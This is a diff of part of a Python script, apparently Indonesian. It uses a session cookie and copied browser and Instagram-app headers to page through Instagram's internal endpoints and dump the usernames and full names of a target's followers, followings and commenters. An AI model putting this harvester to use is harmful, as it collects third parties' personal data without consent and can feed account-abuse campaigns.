+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
+                    'cookie': self.cokie,
+                    'dpr': '1',
+                    'priority': 'u=0, i',
+                    'sec-ch-prefers-color-scheme': 'dark',
+                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-ch-ua-platform-version': '"15.0.0"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
+                    'viewport-width': '673'
+                })
+                self.data = {"query_hash": "c76146de99bb02f6415203be841dd25a","variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
+                self.req = self.r.get('https://www.instagram.com/graphql/query/',params=self.data).json()
+                for self.users in self.req['data']['user']['edge_followed_by']['edges']:
+                    self.udata = self.users['node']['username']+'|'+self.users['node']['full_name'].replace('|','')
+                    dumpdata.append(self.udata)
+                    print(f'success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
+                if(self.req['data']['user']['edge_followed_by']['page_info']['has_next_page']==True):
+                    self.followers(userid, self.req['data']['user']['edge_followed_by']['page_info']['end_cursor'])
+                else: return
+            except:return
+    
+    def following(self,userid,next_pae):
+        with requests.Session() as self.r:
+            try:
+                self.r.headers.update({
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
+                    'cookie': self.cokie,
+                    'dpr': '1',
+                    'priority': 'u=0, i',
+                    'sec-ch-prefers-color-scheme': 'dark',
+                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-ch-ua-platform-version': '"15.0.0"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
+                    'viewport-width': '673'
+                })
+                self.data = {"query_hash": "d04b0a864b4b54837c0d870b0e77e076","variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
+                self.req = self.r.get('https://www.instagram.com/graphql/query/',params=self.data).json()
+                for self.users in self.req['data']['user']['edge_follow']['edges']:
+                    self.udata = self.users['node']['username']+'|'+self.users['node']['full_name'].replace('|','')
+                    dumpdata.append(self.udata)
+                    print(f'success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
+                if(self.req['data']['user']['edge_follow']['page_info']['has_next_page']==True):
+                    self.following(userid, self.req['data']['user']['edge_follow']['page_info']['end_cursor'])
+            except:return
+    
+    def komentar(self, media_id, min_cursor):
+        with requests.Session() as self.r:
+            try:
+                self.r.headers.update({
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
+                    'cache-control': 'max-age=0',
+                    'cookie': self.cokie,
+                    'dpr': '1',
+                    'priority': 'u=0, i',
+                    'sec-ch-prefers-color-scheme': 'dark',
+                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-ch-ua-platform-version': '"15.0.0"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
+                    'viewport-width': '1358',
+                })
+                self.req = self.r.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min_cursor}').json()
+                for self.usr in self.req['comments']:
+                    self.data_ = self.usr['user']['username'] +'|'+ self.usr['user']['full_name']
+                    if self.data_ not in dumpdata: dumpdata.append(self.data_)
+                    print(f'success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
+                self.abc = self.req['next_min_id']
+                self.komentar(media_id, self.abc)
+            except: return
+
+if __name__ == '__main__':
+    menu().instagram()
